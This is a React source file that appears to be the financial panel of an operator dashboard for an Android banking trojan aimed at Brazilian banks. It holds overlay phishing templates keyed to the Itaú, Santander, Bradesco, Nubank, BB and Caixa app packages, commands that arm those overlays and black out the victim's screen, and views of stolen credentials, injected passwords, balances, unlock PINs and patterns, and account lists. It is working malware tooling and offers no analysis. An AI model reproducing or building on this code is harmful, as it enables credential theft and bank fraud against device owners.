import useStore from '../../store/index.js';

export default function Financial({ deviceId, onBack, sendCmd }) {
  const banking    = useStore(s => s.deviceBanking);
  const unlocks    = useStore(s => s.deviceUnlocks);
  const injects    = useStore(s => s.deviceInjects);
  const refreshBanking = useStore(s => s.refreshBanking);

  const credentials = banking.filter(b => b.data_type === 'form_capture' || b.data_type === 'credential');
  const balances    = banking.filter(b => b.data_type === 'balance');
  const accounts    = banking.filter(b => b.data_type === 'account_list' || b.data_type === 'google_accounts');

  const OVERLAYS = [
    { label: '🏦 ITAÚ',      pkg: 'com.itau.android',         template: { title: 'Atualização de Segurança', body: 'Confirme seus dados' } },
    { label: '🏦 SANTANDER', pkg: 'com.santander.app.br',     template: { title: 'Santander Segurança',       body: 'Verificação necessária' } },
    { label: '🏦 BRADESCO',  pkg: 'br.com.bradesco',          template: { title: 'Bradesco',                  body: 'Confirme sua senha' } },
    { label: '💜 NUBANK',    pkg: 'com.nu.production',        template: { title: 'Nu Atualização',            body: 'Confirme sua senha Nu' } },
    { label: '🏦 BB',        pkg: 'br.com.bb.android',        template: { title: 'BB Segurança',              body: 'Acesso necessário' } },
    { label: '🏦 CAIXA',     pkg: 'br.gov.caixa.internet',    template: { title: 'CAIXA',                     body: 'Confirme o acesso' } },
  ];

  return (
    <div className="fade-up">
      <div className="row-sb mb12">
        <div className="bold txt-gold">💰 FINANCEIRO</div>
        <div className="row gap6">
          <button className="btn btn-ghost btn-sm" onClick={refreshBanking}>↺</button>
          <button className="btn btn-ghost btn-sm" onClick={onBack}>← VOLTAR</button>
        </div>
      </div>

      {/* Banking overlay quick launch */}
      <div className="section">
        <div className="section-title">Overlays Bancários</div>
        <div className="grid g2 mb8">
          {OVERLAYS.map(o => (
            <button key={o.pkg} className="btn btn-ghost btn-sm btn-block"
              onClick={() => sendCmd('ARM_OVERLAY_MAPPING', { package: o.pkg, template: o.template })}>
              {o.label}
            </button>
          ))}
        </div>
        <button className="btn btn-danger-soft btn-block btn-sm" onClick={() => sendCmd('BLACK_SCREEN_ON')}>
          🖤 ATIVAR TELA PRETA
        </button>
      </div>

      {/* Captured credentials */}
      <div className="section">
        <div className="section-title">
          Credenciais Capturadas
          <span className="pill pill-red" style={{ marginLeft: 8, fontSize: 10 }}>{credentials.length}</span>
        </div>
        {credentials.length === 0 ? <div className="no-data txt-sm">Nenhuma credencial</div> :
          <div style={{ maxHeight: 280, overflowY: 'auto' }}>
            {credentials.map((b, i) => {
              let payload;
              try { payload = JSON.parse(b.payload); } catch { payload = { raw: b.payload }; }
              return (
                <div key={i} className="card card-sm mb8">
                  <div className="row-sb mb6">
                    <span className="txt-sm bold txt-red">{b.bank}</span>
                    <span className="txt-xs txt-dim">{b.ts ? new Date(b.ts).toLocaleString() : ''}</span>
                  </div>
                  <pre style={{ fontSize: 10, color: 'var(--text2)', whiteSpace: 'pre-wrap', wordBreak: 'break-all', fontFamily: 'var(--mono)' }}>
                    {JSON.stringify(payload, null, 2).slice(0, 300)}
                  </pre>
                </div>
              );
            })}
          </div>
        }
      </div>

      {/* Inject passwords */}
      <div className="section">
        <div className="section-title">
          Senhas dos Injects
          <span className="pill pill-gold" style={{ marginLeft: 8, fontSize: 10 }}>{injects.length}</span>
        </div>
        {injects.length === 0 ? <div className="no-data txt-sm">Nenhuma senha capturada</div> :
          <div style={{ maxHeight: 250, overflowY: 'auto' }}>
            {injects.map((p, i) => (
              <div key={i} className="card card-sm mb6">
                <div className="row-sb mb4">
                  <span className="txt-sm bold">{p.app_name || p.package_name}</span>
                  <span className="txt-xs txt-dim">{p.ts ? new Date(p.ts).toLocaleTimeString() : ''}</span>
                </div>
                <div className="txt-xs txt-mono txt-dim">{p.password?.slice(0, 120) || '—'}</div>
              </div>
            ))}
          </div>
        }
      </div>

      {/* Bank balances */}
      <div className="section">
        <div className="section-title">
          Saldos
          <span className="pill pill-gold" style={{ marginLeft: 8, fontSize: 10 }}>{balances.length}</span>
        </div>
        {balances.length === 0 ? <div className="no-data txt-sm">Nenhum saldo</div> :
          <div style={{ maxHeight: 200, overflowY: 'auto' }}>
            {balances.map((b, i) => {
              let payload; try { payload = JSON.parse(b.payload); } catch { payload = {}; }
              return (
                <div key={i} className="card card-sm mb6">
                  <div className="row-sb">
                    <span className="txt-sm bold txt-gold">{b.bank}</span>
                    <span className="txt-sm bold" style={{ color: '#00c864' }}>
                      {payload.balance || payload.saldo || JSON.stringify(payload).slice(0, 40)}
                    </span>
                  </div>
                </div>
              );
            })}
          </div>
        }
      </div>

      {/* Unlocks */}
      <div className="section">
        <div className="section-title">
          Sequências de Desbloqueio
          <span className="pill pill-purple" style={{ marginLeft: 8, fontSize: 10 }}>{unlocks.length}</span>
        </div>
        {unlocks.length === 0 ? <div className="no-data txt-sm">Nenhuma</div> :
          unlocks.map((u, i) => (
            <div key={i} className="card card-sm mb6">
              <div className="row-sb mb4">
                <span className={`pill ${u.utype === 'PIN' ? 'pill-gold' : 'pill-purple'}`} style={{ fontSize: 10 }}>{u.utype}</span>
                <span className="txt-xs txt-dim">{u.ts ? new Date(u.ts).toLocaleString() : ''}</span>
              </div>
              <div className="txt-xs txt-mono">{(u.payload || '').slice(0, 120)}</div>
            </div>
          ))
        }
      </div>

      {/* Accounts */}
      {accounts.length > 0 && (
        <div className="section">
          <div className="section-title">Contas</div>
          {accounts.map((a, i) => {
            let list; try { list = JSON.parse(a.payload); } catch { list = []; }
            return (
              <div key={i} className="card card-sm mb8">
                <div className="txt-xs txt-dim mb6">{a.bank} — {a.data_type}</div>
                {(Array.isArray(list) ? list : []).slice(0, 5).map((acc, j) => (
                  <div key={j} className="txt-xs txt-mono txt-dim">
                    {typeof acc === 'string' ? acc : JSON.stringify(acc).slice(0, 80)}
                  </div>
                ))}
              </div>
            );
          })}
        </div>
      )}

      <div style={{ height: 20 }} />
    </div>
  );
}
